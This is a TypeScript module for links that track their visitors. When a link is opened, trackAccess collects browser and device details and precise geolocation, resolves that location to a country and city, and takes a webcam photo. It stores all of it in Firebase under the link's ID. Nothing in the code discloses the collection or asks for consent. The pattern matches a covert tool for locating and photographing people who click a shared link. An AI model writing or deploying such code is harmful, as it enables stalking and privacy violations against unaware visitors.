import { ref, push, set } from 'firebase/database';
import { database } from './firebase';

interface TrackingData {
  timestamp: number;
  ip?: string;
  location?: {
    latitude: number;
    longitude: number;
    country?: string;
    countryCode?: string;
    city?: string;
  };
  device?: {
    type: string;
    os: string;
    browser: string;
    screenResolution: string;
  };
  photo?: string;
}

export const capturePhoto = async (): Promise<string> => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    
    return new Promise((resolve, reject) => {
      video.onloadedmetadata = () => {
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        if (ctx) {
          ctx.drawImage(video, 0, 0);
          const photo = canvas.toDataURL('image/jpeg');
          stream.getTracks().forEach(track => track.stop());
          resolve(photo);
        } else {
          reject(new Error('Could not get canvas context'));
        }
      };
    });
  } catch (error) {
    console.error('Error capturing photo:', error);
    return '';
  }
};

export const getDeviceInfo = (): TrackingData['device'] => {
  try {
    const userAgent = navigator.userAgent;
    const screen = window.screen;
    
    return {
      type: /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop',
      os: /Windows|Mac|Linux|Android|iOS/.exec(userAgent)?.[0] || 'Unknown',
      browser: /Chrome|Firefox|Safari|Edge/.exec(userAgent)?.[0] || 'Unknown',
      screenResolution: `${screen.width}x${screen.height}`
    };
  } catch (error) {
    console.error('Error getting device info:', error);
    return {
      type: 'Unknown',
      os: 'Unknown',
      browser: 'Unknown',
      screenResolution: 'Unknown'
    };
  }
};

export const getLocation = async (): Promise<TrackingData['location']> => {
  try {
    const position = await new Promise<GeolocationPosition>((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
      });
    });
    
    // Get country info from coordinates using reverse geocoding
    const response = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
    );
    const data = await response.json();
    
    return {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      country: data.address?.country,
      countryCode: data.address?.country_code?.toUpperCase(),
      city: data.address?.city || data.address?.town
    };
  } catch (error) {
    console.error('Error getting location:', error);
    return undefined;
  }
};

export const trackAccess = async (linkId: string) => {
  try {
    const trackingData: TrackingData = {
      timestamp: Date.now(),
      device: getDeviceInfo()
    };
    
    // Get location
    try {
      const location = await getLocation();
      if (location) {
        trackingData.location = location;
      }
    } catch (error) {
      console.error('Error getting location:', error);
    }
    
    // Capture photo
    try {
      const photo = await capturePhoto();
      if (photo) {
        trackingData.photo = photo;
      }
    } catch (error) {
      console.error('Error capturing photo:', error);
    }
    
    // Save to Firebase
    const accessRef = ref(database, `accesses/${linkId}/${Date.now()}`);
    await set(accessRef, trackingData);
    
    return trackingData;
  } catch (error) {
    console.error('Error tracking access:', error);
    throw error;
  }
}; 